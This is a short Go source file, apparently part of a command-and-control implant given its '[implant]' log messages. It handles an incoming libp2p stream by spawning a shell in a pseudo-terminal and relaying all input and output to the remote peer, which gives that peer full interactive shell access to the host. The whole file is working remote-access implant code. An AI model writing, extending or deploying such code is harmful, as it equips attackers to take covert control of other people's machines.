//go:build !windows

package core

import (
	"encoding/binary"
	"io"
	"log"

	"github.com/creack/pty"
	"github.com/libp2p/go-libp2p/core/network"
)

func (a *Agent) handleShellStream(s network.Stream) {
	defer s.Close()
	remotePeer := s.Conn().RemotePeer()

	var winsize pty.Winsize
	if err := binary.Read(s, binary.LittleEndian, &winsize.Rows); err != nil {
		log.Printf("[implant] read shell rows: %v", err)
		return
	}
	if err := binary.Read(s, binary.LittleEndian, &winsize.Cols); err != nil {
		log.Printf("[implant] read shell cols: %v", err)
		return
	}
	if winsize.Rows < 10 || winsize.Cols < 10 {
		winsize.Rows = 30
		winsize.Cols = 120
	}

	cmd := shellCommand()
	f, err := pty.StartWithSize(cmd, &winsize)
	if err != nil {
		log.Printf("[implant] pty start: %v", err)
		return
	}
	defer f.Close()

	go io.Copy(f, s)
	io.Copy(s, f)

	cmd.Wait()
	log.Printf("[implant] shell session ended for %s", remotePeer.String())
}
